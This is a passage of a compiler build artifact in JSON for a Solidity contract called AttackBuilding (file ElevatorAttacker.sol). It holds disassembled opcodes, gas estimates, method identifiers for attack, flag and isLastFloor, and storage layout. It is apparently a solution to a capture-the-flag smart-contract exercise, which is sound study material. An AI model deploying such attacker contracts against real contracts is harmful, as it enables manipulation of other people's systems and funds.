0x21A DUP2 PUSH2 0x207 JUMP JUMPDEST DUP2 EQ PUSH2 0x225 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x237 DUP2 PUSH2 0x211 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x253 JUMPI PUSH2 0x252 PUSH2 0x202 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x261 DUP5 DUP3 DUP6 ADD PUSH2 0x228 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x27F DUP2 PUSH2 0x26A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x29A PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x276 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2CB DUP3 PUSH2 0x2A0 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2DB DUP2 PUSH2 0x2C0 JUMP JUMPDEST DUP2 EQ PUSH2 0x2E6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x2F8 DUP2 PUSH2 0x2D2 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x314 JUMPI PUSH2 0x313 PUSH2 0x202 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x322 DUP5 DUP3 DUP6 ADD PUSH2 0x2E9 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x367 PUSH2 0x362 PUSH2 0x35D DUP5 PUSH2 0x32B JUMP JUMPDEST PUSH2 0x342 JUMP JUMPDEST PUSH2 0x335 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x377 DUP2 PUSH2 0x34C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x392 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x36E JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x3CC JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x3B1 JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x3DB JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3EC DUP3 PUSH2 0x398 JUMP JUMPDEST PUSH2 0x3F6 DUP2 DUP6 PUSH2 0x3A3 JUMP JUMPDEST SWAP4 POP PUSH2 0x406 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x3AE JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x41E DUP3 DUP5 PUSH2 0x3E1 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH11 0xDB2F790CF17F60CDAFA8B MSIZE CHAINID 0xE6 SAR MSTORE8 BLOCKHASH 0xCA 0xE1 PUSH8 0xB693B4DBA4FCE06E 0xCE MSTORE8 DUP12 PUSH5 0x736F6C6343 STOP ADDMOD 0xC STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "223800",
						"executionCost": "263",
						"totalCost": "224063"
					},
					"external": {
						"attack(address)": "infinite",
						"flag()": "2468",
						"isLastFloor(uint256)": "29128"
					}
				},
				"methodIdentifiers": {
					"attack(address)": "d018db3e",
					"flag()": "890eba68",
					"isLastFloor(uint256)": "5f9a4bca"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 13,
						"contract": "contract/security/ElevatorAttacker.sol:AttackBuilding",
						"label": "flag",
						"offset": 0,
						"slot": "0",
						"type": "t_bool"
					}
				],
				"types": {
					"t_bool": {
						"encoding": "inplace",
						"label": "bool",
						"numberOfBytes": "1"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}